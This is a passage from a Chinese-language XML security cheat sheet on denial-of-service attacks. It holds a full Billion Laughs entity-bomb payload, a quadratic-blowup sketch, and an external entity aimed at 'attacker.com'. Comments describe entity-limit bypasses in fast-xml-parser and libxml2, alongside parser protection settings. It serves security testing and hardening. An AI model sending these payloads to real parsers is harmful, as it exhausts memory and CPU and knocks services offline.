## 十、Billion Laughs 与 DoS 攻击家族

### 10.1 Billion Laughs（指数实体炸弹）
```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<root>&lol9;</root>
```
**危害**：内存/CPU 指数级耗尽。**测试前必须评估影响并取得授权，生产环境禁用。**

### 10.2 Quadratic Blowup（平方级膨胀，更隐蔽）
```xml
<!-- 10万字符 a 重复 10 万次引用 → 100 亿字符输出 -->
<!DOCTYPE a [
  <!ENTITY b "aaaa...(10万字符)">
]>
<root>&b;&b;&b;...(10万次)</root>
```

### 10.3 外部资源 DoS / 重定向放大
```xml
<!-- 指向大文件/慢响应外部资源耗尽带宽 -->
<!ENTITY xxe SYSTEM "http://attacker.com/huge_file">
```

### 10.4 实体扩展限制绕过（2026 新攻击面）
```xml
<!-- fast-xml-parser CVE-2026-33036：数字字符引用 (&#65;) 与标准实体完全绕过
     maxTotalExpansions/maxExpandedLength 计数（修复 5.5.6）——百万级 &#65; 撑爆内存 -->
<!-- GHSA-8r6m-32jq-jx6q：反复插入 DOCTYPE 声明，每次 addInputEntities 重置扩展计数器
     → 单文档多次 DOCTYPE 叠加触发 XML 炸弹（修复 5.10.1 前，5.9.3-5.10.0）-->
<!-- libxml2 CVE-2026-6653：xmlParseInternalSubset UAF DoS（2.9.11-2.11.0）-->
```
**防护对照**：`entity_expansion_limit`（Ruby）、`totalEntitySizeLimit`/`entityExpansionCount`（.NET）、`XML_PARSE_HUGE` 限制（libxml2）、fast-xml-parser 5.5.6+。

